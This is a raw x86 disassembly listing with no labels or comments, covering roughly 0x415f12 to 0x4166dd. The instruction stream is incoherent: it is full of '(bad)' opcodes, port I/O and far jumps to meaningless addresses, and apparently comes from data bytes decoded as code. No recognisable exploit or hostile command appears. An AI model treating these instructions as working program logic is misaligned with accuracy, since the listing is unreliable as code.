  415f12:	mov    DWORD PTR [ecx+0x557e1e58],esp
  415f18:	int3   
  415f19:	sbb    al,0xb6
  415f1b:	add    DWORD PTR [esi-0x56],edi
  415f1e:	out    dx,eax
  415f1f:	jmp    0x5c9c48c
  415f24:	test   al,0xcf
  415f26:	cs pop ecx
  415f28:	stc    
  415f29:	jne    0x415eef
  415f2b:	mov    WORD PTR [ecx+0x632191de],?
  415f31:	push   cs
  415f32:	fnsave [ebx]
  415f34:	sbb    eax,0xa83aee98
  415f39:	ins    BYTE PTR es:[edi],dx
  415f3a:	in     al,dx
  415f3b:	add    al,0x1a
  415f3d:	push   0x5d
  415f3f:	mov    eax,ds:0x26cdf56c
  415f44:	inc    eax
  415f45:	dec    esp
  415f46:	gs mov dl,0x5e
  415f49:	xlat   BYTE PTR ds:[ebx]
  415f4a:	mov    esi,0xa6ea44c4
  415f4f:	cmp    ebp,ebx
  415f51:	pusha  
  415f52:	pop    ebp
  415f53:	or     DWORD PTR [esi+0x5fcf56cf],ebp
  415f59:	fucomp st(6)
  415f5b:	(bad)  
  415f5c:	push   ebx
  415f5d:	loop   0x415f12
  415f5f:	mov    BYTE PTR [ecx-0x2657459b],bh
  415f65:	push   edx
  415f66:	outs   dx,BYTE PTR ds:[esi]
  415f67:	push   ebx
  415f68:	pop    ds
  415f69:	jp     0x415fb8
  415f6b:	pop    ss
  415f6c:	xchg   BYTE PTR [ebx+0x39b1fef0],bl
  415f72:	loope  0x415f74
  415f74:	inc    ecx
  415f75:	test   BYTE PTR [esi-0x67],0x9b
  415f79:	pop    esp
  415f7a:	inc    edx
  415f7b:	lea    eax,ds:[eax+0x1de36114]
  415f82:	fwait
  415f83:	xor    ebx,DWORD PTR [esi+0x2c]
  415f86:	push   ds
  415f87:	mov    ch,0xc4
  415f89:	std    
  415f8a:	bound  eax,QWORD PTR [edx-0x8]
  415f8d:	pop    ebp
  415f8e:	xchg   DWORD PTR [edx+0x63],edx
  415f91:	cdq    
  415f92:	cmp    DWORD PTR [esi+eiz*8+0x5e22a1e0],0xffffffe6
  415f9a:	pop    esp
  415f9b:	mov    ecx,0x6df45925
  415fa0:	jge    0x416014
  415fa2:	out    dx,eax
  415fa3:	loope  0x415f88
  415fa5:	pusha  
  415fa6:	popf   
  415fa7:	mov    ecx,?
  415fa9:	rcl    DWORD PTR [ebx+0x3e],0x78
  415fad:	cmp    esi,ebp
  415faf:	pop    eax
  415fb0:	pop    ds
  415fb1:	push   ebp
  415fb2:	dec    ecx
  415fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb4:	imul   edx,DWORD PTR [ebp+0x70],0xe995cfc9
  415fbb:	fisub  DWORD PTR [edi-0xdf4cd0]
  415fc1:	inc    edx
  415fc2:	or     eax,0xf5a25b9b
  415fc7:	(bad)
  415fca:	into   
  415fcb:	imul   ebx,DWORD PTR [ebp-0x7a],0xd13a111
  415fd2:	adc    BYTE PTR [ecx+0x3a],dh
  415fd5:	fmulp  st(3),st
  415fd7:	cmp    al,0x5e
  415fd9:	mov    ss,WORD PTR [ebx]
  415fdb:	clc    
  415fdc:	ss aaa 
  415fde:	(bad)  
  415fdf:	sti    
  415fe0:	(bad)  
  415fe1:	sbb    bl,ah
  415fe3:	fcomp  DWORD PTR [esi-0x1d]
  415fe6:	push   edx
  415fe7:	in     eax,0x8e
  415fe9:	fwait
  415fea:	or     bh,BYTE PTR [eax-0x514587a2]
  415ff0:	scas   al,BYTE PTR es:[edi]
  415ff1:	retf   0x32f2
  415ff4:	inc    edx
  415ff5:	dec    edx
  415ff6:	mov    esp,0x26080d7
  415ffb:	or     ecx,DWORD PTR [ebx+0x331f3271]
  416001:	xchg   ebx,eax
  416002:	in     eax,dx
  416003:	and    BYTE PTR [ebp+0x59cfdb7f],bh
  416009:	or     BYTE PTR [edi],ah
  41600b:	jnp    0x416078
  41600d:	pusha  
  41600e:	sbb    BYTE PTR [ecx+0x621cc85],bl
  416014:	sbb    eax,0x293eee6
  416019:	shl    edx,1
  41601b:	(bad)  
  41601d:	inc    edx
  41601e:	xchg   ebx,eax
  41601f:	stos   DWORD PTR es:[edi],eax
  416020:	sub    DWORD PTR [esi+0x1c0fe76e],edi
  416026:	dec    ebp
  416027:	fs sbb bl,dh
  41602a:	(bad)  
  41602c:	pop    ebx
  41602d:	and    ebx,DWORD PTR [ebx+0x13]
  416030:	push   esi
  416031:	lds    edi,FWORD PTR [esi]
  416033:	fisttp WORD PTR [ebx]
  416035:	mov    eax,ds:0xc19974f
  41603a:	mov    fs,WORD PTR [edx-0xa181173]
  416040:	push   cs
  416041:	xor    DWORD PTR [ecx-0x513f3f52],ecx
  416047:	and    DWORD PTR [edi+0x4c],0x8
  41604b:	mov    WORD PTR [ebx],?
  41604d:	stos   BYTE PTR es:[edi],al
  41604e:	out    dx,al
  41604f:	sbb    BYTE PTR [edi+0xe716c17],bl
  416055:	pusha  
  416056:	mov    al,ds:0x7ba3daba
  41605b:	sub    cl,BYTE PTR [ebp+ecx*4-0x7]
  41605f:	jge    0x4160bc
  416061:	mov    dl,0xe7
  416063:	test   DWORD PTR [ecx],ecx
  416065:	cli    
  416066:	inc    DWORD PTR [eax]
  416068:	fistp  QWORD PTR [esp+edi*2+0x54]
  41606c:	jmp    0xbfd87ad1
  416071:	test   al,0x58
  416073:	loop   0x416080
  416075:	data16 out dx,al
  416077:	xchg   BYTE PTR [ebp+0x10],ch
  41607a:	stc    
  41607b:	scas   al,BYTE PTR es:[edi]
  41607c:	jae    0x41609c
  41607e:	mov    bl,0xa7
  416080:	loope  0x4160c3
  416082:	inc    ebp
  416083:	paddusb mm1,mm5
  416086:	add    edi,ebp
  416088:	into   
  416089:	xchg   ecx,eax
  41608a:	and    DWORD PTR [eax],ecx
  41608c:	pop    ebp
  41608d:	sbb    BYTE PTR [ecx-0x102a2719],ah
  416093:	dec    ebx
  416094:	xchg   BYTE PTR [edi+0x4c],cl
  416097:	mov    ds:0x380aa8ad,al
  41609c:	pop    esp
  41609d:	call   0xff3:0x45a4b190
  4160a4:	xor    eax,0xb4216ecb
  4160a9:	jp     0x416031
  4160ab:	push   esp
  4160ac:	loope  0x41605c
  4160ae:	ret    0x2ba0
  4160b1:	and    BYTE PTR [edi-0x63],dh
  4160b4:	fld    TBYTE PTR [edi+0x7]
  4160b7:	aaa    
  4160b8:	pop    edi
  4160b9:	pop    es
  4160ba:	jle    0x416086
  4160bc:	cs push ebx
  4160be:	clc    
  4160bf:	dec    ebx
  4160c0:	and    ebx,ecx
  4160c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160c3:	pop    eax
  4160c4:	leave  
  4160c5:	mov    esi,0x97e2a152
  4160ca:	jne    0x41610f
  4160cc:	cmp    eax,0x5e643c78
  4160d1:	mov    eax,0xa0843985
  4160d6:	stc    
  4160d7:	enter  0x610d,0xca
  4160db:	daa    
  4160dc:	mov    edi,ebx
  4160de:	cmp    DWORD PTR [esp+eax*2-0xc160f32],esi
  4160e5:	cmp    edx,0x97146240
  4160eb:	mov    ss,WORD PTR [eax+eiz*2+0x3fe6cc6d]
  4160f2:	pop    esi
  4160f3:	out    dx,al
  4160f4:	je     0x416138
  4160f6:	out    dx,al
  4160f7:	ret    0xc5a7
  4160fa:	jl     0x4160f2
  4160fc:	cmp    edx,0x51faede0
  416102:	ror    DWORD PTR [eax+0x300deeb4],cl
  416108:	jecxz  0x4160dc
  41610a:	(bad)  
  41610b:	jo     0x4160fb
  41610d:	and    ebx,ebp
  41610f:	enter  0x531b,0x80
  416113:	iret   
  416114:	adc    al,BYTE PTR [ecx]
  416116:	daa    
  416117:	pop    edi
  416118:	shl    BYTE PTR [ebx],1
  41611a:	xor    eax,0x6748f9ab
  41611f:	mov    fs,edi
  416121:	sbb    BYTE PTR gs:[ecx-0x3b],al
  416125:	and    al,0x8d
  416127:	lock pop esi
  416129:	dec    ebp
  41612a:	daa    
  41612b:	out    0x1e,al
  41612d:	add    esi,DWORD PTR [esi-0x7b]
  416130:	and    DWORD PTR [ecx+0x3],esp
  416133:	push   es
  416134:	mov    ch,0x75
  416136:	ins    BYTE PTR es:[edi],dx
  416137:	ret    
  416138:	cdq    
  416139:	xor    ebp,esi
  41613b:	sbb    dh,0xd
  41613e:	js     0x4161ad
  416140:	les    esi,FWORD PTR [edx]
  416142:	jmp    0xec843de7
  416147:	mov    ebx,0x1c8c8005
  41614c:	dec    ebx
  41614d:	and    al,ah
  41614f:	nop
  416150:	pop    ebp
  416151:	in     eax,0x7c
  416153:	jmp    0x277444f0
  416158:	out    dx,eax
  416159:	pop    ebp
  41615a:	xchg   edi,eax
  41615b:	retf   0xa9fe
  41615e:	jae    0x416135
  416160:	mov    esi,0x5ef071ed
  416165:	jl     0x41612b
  416167:	xchg   esp,eax
  416168:	xor    DWORD PTR [ecx],edx
  41616a:	pop    ds
  41616b:	mov    bl,0xa9
  41616d:	daa    
  41616e:	lods   al,BYTE PTR ds:[esi]
  41616f:	in     eax,dx
  416170:	loopne 0x4161d2
  416172:	push   ecx
  416173:	inc    esp
  416174:	dec    ecx
  416175:	loop   0x416106
  416177:	(bad)  
  416178:	rcl    ebp,1
  41617a:	out    dx,al
  41617b:	cmp    dh,BYTE PTR [ebx]
  41617d:	cli    
  41617e:	inc    ebp
  41617f:	arpl   WORD PTR [ebx+esi*8+0xe],cx
  416183:	mov    eax,ds:0xcaf57fdb
  416188:	sub    eax,0x5e13ba40
  41618d:	push   0xd63f1e00
  416192:	in     eax,0x7e
  416194:	push   esi
  416195:	popa   
  416196:	xor    esi,ebp
  416198:	stc    
  416199:	cs cli 
  41619b:	mov    al,0xcb
  41619d:	and    esp,DWORD PTR [eax]
  41619f:	adc    eax,0xa43b0537
  4161a4:	adc    DWORD PTR [ebp-0x66b03368],eax
  4161aa:	pop    ss
  4161ab:	loope  0x416144
  4161ad:	pusha  
  4161ae:	and    eax,0x2fc96e73
  4161b3:	mov    esp,0x65ee7e2f
  4161b8:	jnp    0x4161d0
  4161ba:	push   cs
  4161bb:	cs jp  0x416147
  4161be:	retf   0x6ba0
  4161c1:	mov    ss:0xad95ce7a,al
  4161c7:	out    0x5e,al
  4161c9:	and    eax,0xf05895b7
  4161ce:	inc    ecx
  4161cf:	arpl   ax,cx
  4161d1:	pop    edi
  4161d2:	ja     0x416178
  4161d4:	test   al,0x33
  4161d6:	adc    eax,0xa3b0b583
  4161db:	call   0xef73f3e
  4161e0:	(bad)  
  4161e1:	call   0x6b93:0x61420146
  4161e8:	push   eax
  4161e9:	adc    ebx,DWORD PTR [ebx+0x20]
  4161ec:	icebp  
  4161ed:	cmp    ebp,edi
  4161ef:	inc    ebp
  4161f0:	jo     0x416263
  4161f2:	shl    ecx,1
  4161f4:	inc    esi
  4161f5:	loopne 0x416261
  4161f7:	adc    ah,BYTE PTR [edx+0x7fa164d2]
  4161fd:	cs push cs
  4161ff:	aad    0xc8
  416201:	mov    ecx,DWORD PTR [edi-0x4a]
  416204:	repz in al,0xee
  416207:	in     eax,0x1c
  416209:	mov    ds:0xc953f48f,al
  41620e:	mov    WORD PTR [ebx-0x5ec15305],es
  416214:	adc    BYTE PTR [esi],dl
  416216:	cmp    DWORD PTR [ecx],ebp
  416218:	xor    edi,DWORD PTR [ecx-0x18]
  41621b:	lock pop edi
  41621d:	and    al,0xd6
  41621f:	loop   0x416298
  416221:	and    eax,0x5002934
  416226:	fsub   QWORD PTR [eax-0x34477ab8]
  41622c:	repz xchg edi,eax
  41622e:	pop    ebp
  41622f:	out    0x36,al
  416231:	pop    edi
  416232:	push   ebx
  416233:	and    DWORD PTR [ebp+0x24],esp
  416236:	(bad)  
  416238:	lea    ebp,ds:0x8ca0a2
  41623e:	cdq    
  41623f:	fistp  QWORD PTR [esi]
  416241:	rol    DWORD PTR [esi],1
  416243:	cmc    
  416244:	dec    eax
  416245:	pop    ss
  416246:	out    dx,al
  416247:	cmp    al,0xb4
  416249:	xchg   esi,eax
  41624a:	pop    edi
  41624b:	cli    
  41624c:	jno    0x41628f
  41624e:	jo     0x416261
  416250:	pop    ebp
  416251:	popa   
  416252:	mov    cl,BYTE PTR [eax+0x389c10d9]
  416258:	or     cl,bl
  41625a:	out    dx,al
  41625b:	sbb    edi,edi
  41625d:	sub    edi,DWORD PTR [eax-0x19e7cda9]
  416263:	mov    al,ds:0xef7256fd
  416268:	adc    edx,DWORD PTR [eax+0x7a]
  41626b:	jp     0x4162cb
  41626d:	xchg   ebp,eax
  41626e:	mov    bl,BYTE PTR [eax+ebp*4-0x73daa57d]
  416275:	pusha  
  416276:	xchg   ebx,eax
  416277:	or     ebx,DWORD PTR [esi-0x7b0fbcdb]
  41627d:	push   0xffffffee
  41627f:	and    BYTE PTR [edi+0x16],ch
  416282:	sub    DWORD PTR [edx-0x78698642],edi
  416288:	sub    DWORD PTR [ecx-0x40],esp
  41628b:	mov    bh,0xa9
  41628d:	dec    edx
  41628e:	mov    BYTE PTR ds:0x9ee6a74,bh
  416294:	adc    dh,BYTE PTR [esi+0x1a]
  416297:	and    al,ah
  416299:	cmp    bh,BYTE PTR [edx]
  41629b:	mov    eax,ds:0xf1c081b5
  4162a0:	fistp  DWORD PTR [eax+0x1b]
  4162a3:	cmp    al,0x5b
  4162a5:	test   BYTE PTR [esi+eiz*8+0x1a],al
  4162a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162aa:	mov    ebx,0xdc0144f4
  4162af:	mov    esp,0xaf3a614b
  4162b4:	adc    dh,ch
  4162b6:	cwde   
  4162b7:	call   0x9d66:0xd8ee984c
  4162be:	or     eax,0xcfffa628
  4162c3:	mov    al,ds:0xe9034ca3
  4162c8:	loop   0x41626f
  4162ca:	jp     0x41631f
  4162cc:	jo     0x4162dc
  4162ce:	out    0x1e,eax
  4162d0:	push   edx
  4162d1:	dec    esi
  4162d2:	aaa    
  4162d3:	popa   
  4162d4:	pop    esi
  4162d5:	push   cs
  4162d6:	dec    eax
  4162d7:	mov    bl,0x1d
  4162d9:	popa   
  4162da:	movhps QWORD PTR [ebx+ebx*8+0x4272437c],xmm2
  4162e2:	out    dx,al
  4162e3:	xchg   edx,eax
  4162e4:	or     ch,BYTE PTR [eax+esi*8]
  4162e7:	pushf  
  4162e8:	push   ebp
  4162e9:	adc    eax,0x7249a1eb
  4162ee:	sbb    cl,dh
  4162f0:	in     al,0x86
  4162f2:	push   0x51
  4162f4:	and    BYTE PTR [eax+0x62274dee],0x1
  4162fb:	int3   
  4162fc:	in     al,dx
  4162fd:	push   esi
  4162fe:	loop   0x4162a0
  416300:	pop    ebp
  416301:	mov    BYTE PTR [ebx+0x4b],cl
  416304:	mov    dl,0x7e
  416306:	adc    esi,DWORD PTR [eax]
  416308:	arpl   WORD PTR [esi-0x3],bx
  41630b:	test   eax,0xbaeba43d
  416310:	jl     0x4162cd
  416312:	cmp    al,0x51
  416314:	fldcw  WORD PTR [edx-0x32]
  416317:	xchg   esp,eax
  416318:	(bad)  [ebp+0x23]
  41631b:	ins    BYTE PTR es:[edi],dx
  41631c:	pop    esi
  41631d:	adc    bh,bh
  41631f:	out    dx,eax
  416320:	jnp    0x4162ae
  416322:	pop    esi
  416323:	leave  
  416324:	pop    ecx
  416325:	pop    edx
  416326:	les    edx,FWORD PTR [esi-0x43]
  416329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41632a:	cs push edx
  41632c:	aad    0x31
  41632e:	or     BYTE PTR [esi+0x612bde32],0x88
  416335:	sti    
  416336:	pushf  
  416337:	push   ds
  416338:	inc    esi
  416339:	dec    edx
  41633a:	and    edx,DWORD PTR [ecx-0x4d]
  41633d:	loopne 0x41635e
  41633f:	popf   
  416340:	div    bh
  416342:	pop    esp
  416343:	mov    edi,0x9f56897
  416348:	fimul  WORD PTR [eax+esi*1]
  41634b:	into   
  41634c:	or     BYTE PTR [esi-0x68291619],bl
  416352:	out    dx,al
  416353:	mov    ah,dl
  416355:	mov    eax,ds:0xf5490b43
  41635a:	rcr    eax,cl
  41635c:	push   eax
  41635d:	mov    ch,0xee
  41635f:	dec    eax
  416360:	shl    DWORD PTR [edx+0x7ded34c5],1
  416366:	out    dx,al
  416367:	jmp    FWORD PTR [esi]
  416369:	mov    dl,0x69
  41636b:	pop    esi
  41636c:	into   
  41636d:	test   eax,0x9d14a1a6
  416372:	jmp    0x8736c0f4
  416377:	out    0xeb,al
  416379:	into   
  41637a:	out    dx,al
  41637b:	pushf  
  41637c:	jne    0x416341
  41637e:	ret    0xb620
  416381:	outs   dx,BYTE PTR ds:[esi]
  416382:	jge    0x416325
  416384:	and    al,0x89
  416386:	mov    eax,ds:0x4fd889b1
  41638b:	loope  0x4163eb
  41638d:	icebp  
  41638e:	out    0x75,eax
  416390:	repz repz sar BYTE PTR [esi],cl
  416394:	scas   eax,DWORD PTR es:[edi]
  416395:	push   edx
  416396:	or     dh,BYTE PTR [ebx]
  416398:	cdq    
  416399:	in     al,0x17
  41639b:	mov    eax,ds:0x8e3a25a2
  4163a0:	cmp    eax,0x804e26c4
  4163a5:	pusha  
  4163a6:	push   cs
  4163a7:	aaa    
  4163a8:	arpl   cx,dx
  4163aa:	adc    ebx,ebx
  4163ac:	sahf   
  4163ad:	pusha  
  4163ae:	sti    
  4163af:	jnp    0x416399
  4163b1:	push   0xffffffcf
  4163b3:	mov    esi,DWORD PTR [ebx-0x39c511f8]
  4163b9:	mov    WORD PTR [esi+0x1a1f1190],gs
  4163bf:	test   al,0xe
  4163c1:	xchg   edi,eax
  4163c2:	or     cl,ah
  4163c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c5:	sub    BYTE PTR [ecx-0x64],0xc2
  4163c9:	or     al,0xee
  4163cb:	ret    0xdacc
  4163ce:	pop    si
  4163d0:	pushf  
  4163d1:	push   ds
  4163d2:	cmp    esp,DWORD PTR [ecx+0xbf87b30]
  4163d8:	retf   
  4163d9:	out    dx,al
  4163da:	add    ebx,DWORD PTR [esi+ebx*2]
  4163dd:	jmp    0xe7fa97a5
  4163e2:	jmp    0x6d25:0x7442f87
  4163e9:	rcl    ebp,0x20
  4163ec:	sbb    edi,edx
  4163ee:	in     eax,0x91
  4163f0:	jg     0x4163c3
  4163f2:	pop    ds
  4163f3:	push   ds
  4163f4:	scas   al,BYTE PTR es:[edi]
  4163f5:	loopne 0x4163cf
  4163f7:	sbb    al,0x53
  4163f9:	jecxz  0x416421
  4163fb:	into   
  4163fc:	mov    bh,0x38
  4163fe:	pop    edi
  4163ff:	push   ebx
  416400:	jo     0x416463
  416402:	pop    eax
  416403:	mov    eax,ds:0x8bb8223c
  416408:	(bad)  
  416409:	jmp    0x3ed9:0x205ecbfc
  416410:	pop    esp
  416411:	add    BYTE PTR [ebx-0x45],cl
  416414:	fldenv [eax-0x35]
  416417:	xor    eax,0x788b7416
  41641c:	into   
  41641d:	cmp    ebp,esi
  41641f:	nop
  416420:	imul   ecx,DWORD PTR [esi+0x3f],0x7dc62821
  416427:	stos   DWORD PTR es:[edi],eax
  416428:	outs   dx,BYTE PTR ds:[esi]
  416429:	pusha  
  41642a:	and    BYTE PTR [edi],al
  41642c:	outs   dx,DWORD PTR ds:[esi]
  41642d:	int    0x70
  41642f:	adc    BYTE PTR [ebp-0x52ae00b3],al
  416435:	into   
  416436:	out    dx,al
  416437:	sahf   
  416438:	dec    eax
  416439:	mov    WORD PTR [eax],?
  41643b:	pop    esi
  41643c:	mov    esp,0x4da0b2ba
  416441:	sbb    al,0x1f
  416443:	mov    edi,0x19069b91
  416448:	pop    esi
  416449:	and    eax,0xb95cc27b
  41644e:	or     eax,DWORD PTR [edx+0x107c60f6]
  416454:	push   ebp
  416455:	(bad)  
  416456:	and    DWORD PTR [edi],ebx
  416458:	(bad)  
  416459:	and    eax,0xe10eb121
  41645e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41645f:	lock mov dl,0x32
  416462:	mov    bh,0x87
  416464:	or     DWORD PTR [ecx-0x2d],esp
  416467:	bnd jp 0x4164c4
  41646a:	cmc    
  41646b:	xor    ch,ah
  41646d:	jp     0x41645d
  41646f:	scas   eax,DWORD PTR es:[edi]
  416470:	popf   
  416471:	mov    edi,0xd53404db
  416476:	sti    
  416477:	stos   BYTE PTR es:[edi],al
  416478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416479:	sub    al,0xee
  41647b:	btc    edx,ebx
  41647e:	sub    ebp,DWORD PTR [edx+0x25ee181b]
  416484:	idiv   bl
  416486:	rol    eax,cl
  416488:	mov    edx,0xedc71f1c
  41648d:	and    eax,0x682ca18e
  416492:	sbb    bh,BYTE PTR [edi+0x1aee482f]
  416498:	(bad)  
  41649a:	es dec edx
  41649c:	loop   0x4164dd
  41649e:	mov    ax,ds:0x8ab79c75
  4164a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164a5:	cmp    BYTE PTR [ebp+0x44],bl
  4164a8:	pop    esi
  4164a9:	imul   ecx,DWORD PTR [eax],0x41
  4164ac:	xor    DWORD PTR [esi],edi
  4164ae:	jmp    edi
  4164b0:	in     al,0x5d
  4164b2:	test   DWORD PTR [ebx],eax
  4164b4:	int3   
  4164b5:	ffree  st(0)
  4164b7:	sahf   
  4164b8:	into   
  4164b9:	dec    eax
  4164ba:	arpl   WORD PTR [edx+0x52b4065e],cx
  4164c0:	pop    ebx
  4164c1:	cli    
  4164c2:	icebp  
  4164c3:	xchg   esp,eax
  4164c4:	push   eax
  4164c5:	popa   
  4164c6:	(bad)  
  4164c7:	(bad)  
  4164c8:	mov    ds:0x42ce52ba,eax
  4164cd:	jbe    0x41654d
  4164cf:	jae    0x41652e
  4164d1:	add    eax,0x360ed316
  4164d6:	mov    ecx,0xad0e3eda
  4164db:	mov    al,ds:0x37238be
  4164e0:	xchg   esp,eax
  4164e1:	jl     0x41653d
  4164e3:	adc    bl,BYTE PTR [esi-0x3b]
  4164e6:	and    al,0x79
  4164e8:	shl    DWORD PTR [esi-0x596e77de],1
  4164ee:	mov    al,ds:0x6113f8a1
  4164f3:	mov    WORD PTR [eax+0x48],fs
  4164f6:	ficom  DWORD PTR [ebp+0xe4fec5e]
  4164fc:	inc    ebx
  4164fd:	outs   dx,BYTE PTR ds:[esi]
  4164fe:	and    bl,0x29
  416501:	stos   DWORD PTR es:[edi],eax
  416502:	aaa    
  416503:	jns    0x416570
  416505:	pusha  
  416506:	(bad)  
  416507:	stos   DWORD PTR es:[edi],eax
  416508:	call   0xee3c:0x5cde2be4
  41650f:	mov    ?,WORD PTR [eax]
  416511:	out    0xa9,eax
  416513:	fwait
  416514:	cmp    ebp,DWORD PTR [ecx-0x35555dc9]
  41651a:	loopne 0x416566
  41651c:	or     eax,0x4b713db7
  416521:	(bad)  
  416522:	out    dx,al
  416523:	xor    ebp,DWORD PTR [ebp+0x1bb7a003]
  416529:	push   ds
  41652a:	iret   
  41652b:	mov    al,ds:0x18b2ba8c
  416530:	inc    ecx
  416531:	mov    cl,0xbc
  416533:	aaa    
  416534:	pop    esi
  416535:	mov    eax,ds:0x8d49779b
  41653a:	jle    0x416518
  41653c:	and    DWORD PTR [ebx+0x8],eax
  41653f:	nop
  416540:	lahf   
  416541:	lahf   
  416542:	pop    ebp
  416543:	pop    edx
  416544:	sub    dl,al
  416546:	pop    edi
  416547:	mov    cl,0x5a
  416549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41654a:	in     eax,dx
  41654b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41654c:	(bad)  
  41654d:	loopne 0x416573
  41654f:	fist   DWORD PTR [ebx+0x25]
  416552:	push   cs
  416553:	sub    BYTE PTR [ebx-0x7c25d7a0],dl
  416559:	sbb    eax,0x31929f00
  41655e:	jmp    0x4164ed
  416560:	hlt    
  416561:	dec    ebx
  416562:	es pop ebx
  416564:	imul   ecx,eax,0x60b5c011
  41656a:	pop    ebp
  41656b:	stos   BYTE PTR es:[edi],al
  41656c:	or     al,al
  41656e:	loop   0x416536
  416570:	sahf   
  416571:	jle    0x416594
  416573:	call   0x6195:0x9187e0df
  41657a:	jmp    0x4164fe
  41657c:	lahf   
  41657d:	pop    ecx
  41657e:	scas   eax,DWORD PTR es:[edi]
  41657f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416580:	sub    bl,ch
  416582:	fld    DWORD PTR [eax]
  416584:	in     eax,dx
  416585:	xchg   ecx,eax
  416586:	jo     0x41657b
  416588:	pop    esi
  416589:	ret    0x8d1a
  41658c:	(bad)  
  41658d:	add    DWORD PTR [ecx+ecx*8+0x47],ecx
  416591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416592:	jecxz  0x416534
  416594:	xchg   BYTE PTR [eax+0x3b],dl
  416597:	push   ecx
  416598:	xor    DWORD PTR ds:0xe16366d8,edi
  41659e:	std    
  41659f:	jnp    0x4165a5
  4165a1:	xchg   edx,eax
  4165a2:	cmc    
  4165a3:	shl    ch,0x77
  4165a6:	sbb    ebp,DWORD PTR [edi+0x1]
  4165a9:	stos   DWORD PTR es:[edi],eax
  4165aa:	jne    0x416555
  4165ac:	test   eax,0xf6e48171
  4165b1:	and    BYTE PTR [ecx],dh
  4165b3:	pop    eax
  4165b4:	icebp  
  4165b5:	jns    0x416559
  4165b7:	mov    edx,0x2a6f4e5e
  4165bc:	ret    0xbfea
  4165bf:	adc    esi,ebp
  4165c1:	pop    ecx
  4165c2:	fwait
  4165c3:	cmp    bh,BYTE PTR [edi+0x4c43ffd8]
  4165c9:	xchg   ebp,eax
  4165ca:	jle    0x41657f
  4165cc:	pop    es
  4165cd:	imul   dh
  4165cf:	xchg   BYTE PTR [esi-0x5f545be6],dl
  4165d5:	cli    
  4165d6:	popf   
  4165d7:	mov    al,ds:0x7205fb94
  4165dc:	fucomp st(3)
  4165de:	es in  eax,0x78
  4165e1:	inc    eax
  4165e2:	jns    0x4165f4
  4165e4:	pop    esi
  4165e5:	pop    eax
  4165e6:	mov    DWORD PTR [edx+0x6d421e4b],0xba635e43
  4165f0:	sahf   
  4165f1:	lods   al,BYTE PTR ds:[esi]
  4165f2:	test   BYTE PTR [edi+0x1b86176],dl
  4165f8:	xor    eax,0xe1a16bda
  4165fd:	pushf  
  4165fe:	mov    ecx,0x578c591a
  416603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416604:	push   ebx
  416605:	jns    0x41664e
  416607:	mov    bh,0xf3
  416609:	mov    al,ds:0xd8cc2058
  41660e:	out    dx,al
  41660f:	sbb    DWORD PTR [esi-0x637b1715],ebx
  416615:	rcl    BYTE PTR [ecx],0xa1
  416618:	clc    
  416619:	(bad)  
  41661a:	aas    
  41661b:	mov    al,0x49
  41661d:	mov    edi,DWORD PTR [ecx+0xadd64db]
  416623:	ss cli 
  416625:	add    BYTE PTR [edi],al
  416627:	(bad)  
  416628:	stc    
  416629:	xchg   esp,eax
  41662a:	test   eax,0xbd6837a0
  41662f:	dec    edi
  416630:	push   eax
  416631:	cld    
  416632:	popf   
  416633:	pop    eax
  416634:	pop    esi
  416635:	adc    ecx,esi
  416637:	xchg   ebp,eax
  416638:	call   DWORD PTR ds:0x79649ca2
  41663e:	sub    eax,0xe05fc57c
  416643:	lds    ebx,FWORD PTR [ebx-0x5d]
  416646:	and    BYTE PTR ds:0xc3ae9ce5,al
  41664c:	pop    esi
  41664d:	adc    DWORD PTR [ebx],ebx
  41664f:	jo     0x416696
  416651:	dec    edx
  416652:	ret    
  416653:	lahf   
  416654:	icebp  
  416655:	pusha  
  416656:	ja     0x4165f3
  416658:	(bad)  
  416659:	or     eax,0x812c3442
  41665e:	dec    edx
  41665f:	push   ss
  416660:	push   ss
  416661:	ins    BYTE PTR es:[edi],dx
  416662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416663:	mov    al,ds:0xc14564e3
  416668:	frstor [ebx]
  41666a:	loopne 0x4166dd
  41666c:	ret    
  41666d:	pusha  
  41666e:	mov    eax,0x4081a77b
  416673:	(bad)  
  416674:	xor    al,0xcb
  416676:	out    dx,al
  416677:	aaa    
  416678:	repnz cmp BYTE PTR [esi+0x29],ah
  41667c:	fdivr  st,st(5)
  41667e:	mov    ds:0xfc3bec7d,eax
  416684:	aaa    
  416685:	iret   
  416686:	outs   dx,BYTE PTR ds:[esi]
  416687:	push   edx
  416688:	rol    DWORD PTR [eax],1
  41668a:	dec    DWORD PTR [edx+0x5e]
  41668d:	xor    BYTE PTR ds:0xb9fc1f88,dh
  416693:	out    dx,eax
  416694:	out    dx,eax
  416695:	pop    edi
  416696:	jmp    0x78c68fd5
  41669b:	lds    eax,FWORD PTR [eax-0x5e]
  41669e:	ss ds loope 0x41669c
  4166a2:	in     eax,0x90
  4166a4:	push   ebx
  4166a5:	push   edx
  4166a6:	push   ss
  4166a7:	in     al,0x5e
  4166a9:	lea    esp,ds:0x337473c6
  4166af:	mov    eax,ds:0xf2f8455b
  4166b4:	push   ecx
  4166b5:	cmp    al,0xe0
  4166b7:	je     0x416714
  4166b9:	in     al,dx
  4166ba:	cmp    al,0x51
  4166bc:	pop    ds
  4166bd:	xchg   edx,eax
  4166be:	sahf   
  4166bf:	inc    esp
  4166c0:	xor    bl,BYTE PTR [ecx]
  4166c2:	xchg   esp,eax
  4166c3:	pushf  
  4166c4:	or     bh,bh
  4166c6:	ins    DWORD PTR es:[edi],dx
  4166c7:	sbb    DWORD PTR [esi+0x55],0x57
  4166cb:	(bad)  
  4166cc:	out    dx,al
  4166cd:	jae    0x4166bd
  4166cf:	aaa    
  4166d0:	xor    al,0xe3
  4166d2:	mov    ds:0xf551003,eax
  4166d7:	mov    eax,ds:0x42669919
  4166dc:	pop    es
  4166dd:	and    al,0x24
